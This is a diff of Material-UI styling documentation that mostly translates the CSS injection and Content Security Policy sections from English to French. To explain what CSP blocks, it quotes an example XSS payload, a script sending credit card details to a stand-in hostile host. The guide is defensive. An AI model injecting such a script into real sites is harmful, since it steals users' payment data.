@@ -104,7 +104,7 @@ const useStyles = makeStyles({
 
 The CSS injected by Material-UI to style a component has the highest specificity possible as the `<link>` is injected at the bottom of the `<head>` to ensure the components always render correctly.
 
-You might, however, also want to override these styles, for example with styled-components. If you are experiencing a CSS injection order issue, JSS [provides a mechanism](https://github.com/cssinjs/jss/blob/next/docs/setup.md#specify-the-dom-insertion-point) to handle this situation. By adjusting the placement of the `insertionPoint` within your HTML head you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.
+You might, however, also want to override these styles, for example with styled-components. If you are experiencing a CSS injection order issue, JSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to handle this situation. By adjusting the placement of the `insertionPoint` within your HTML head you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.
 
 ### HTML comment
 
@@ -274,26 +274,26 @@ const Button = styled(styles, { name: 'button' })(ButtonBase);
 const Button = withStyles(styles, { name: 'button' })(ButtonBase);
 ```
 
-## Content Security Policy (CSP)
+## Politique de sécurité du contenu (CSP)
 
-### What is CSP and why is it useful?
+### Qu'est-ce que le CSP et en quoi est-ce utile ?
 
-Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:
+Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à ` https://example.com ` l'en-tête CSP ` default-src: 'self'; ` autorisera toutes les requêtes à destination de ` https://example.com/* ` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :
 
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
     
 
-This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
+Cette vulnérabilité permettrait à l'attaquant d'exécuter n'importe quoi. Cependant, avec un en-tête CSP sécurisé, le navigateur ne chargera pas ce script.
 
 You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
 
-### How does one implement CSP?
+### Comment met-on en place un CSP?
 
-In order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add a server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/next/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.
+Pour utiliser CSP avec Material-UI (et JSS), vous devez utiliser un "nonce". Un "nonce" est une chaîne générée aléatoirement, utilisée une seule fois. Vous devez donc ajouter un proxy (middleware serveur) pour en générer un à chaque requête. JSS a un [ excellent tutoriel ](https://github.com/cssinjs/jss/blob/next/docs/csp.md) comment y parvenir avec Express et React Helmet. Pour un aperçu de base, continuez à lire.
 
-A CSP nonce is a Base 64 encoded string. You can generate one like this:
+Un nonce CSP est une chaîne codée en Base 64. Vous pouvez en générer un comme ceci:
 
 ```js
 import uuidv4 from 'uuid/v4';
@@ -301,14 +301,14 @@ import uuidv4 from 'uuid/v4';
 const nonce = new Buffer(uuidv4()).toString('base64');
 ```
 
-It is very important you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:
+Il est très important d’utiliser UUID version 4, car cela génère un token ** imprévisible. **. Vous appliquez ensuite ce nonce à l'en-tête CSP. Un en-tête CSP pourrait ressembler à ceci avec le nonce appliqué:
 
 ```js
 header('Content-Security-Policy')
   .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
 ```
 
-If you are using Server Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.
+Si vous utilisez le rendu SSR (Server Side Rendering), vous devez transmettre le nonce dans la balise `<style>` sur le serveur.
 
 ```jsx
 <style
@@ -318,7 +318,7 @@ If you are using Server Side Rendering (SSR), you should pass the nonce in the `
 />
 ```
 
-Then, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags. The client side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.
+Ensuite, vous devez transmettre ce nonce à JSS afin qu’il puisse l’ajouter aux balises `<style>` suivantes. Le côté client obtient le nonce à partir d'un en-tête. Vous devez inclure cet en-tête, que le SSR soit utilisé ou non.
 
 ```jsx
 <meta property="csp-nonce" content={nonce} />
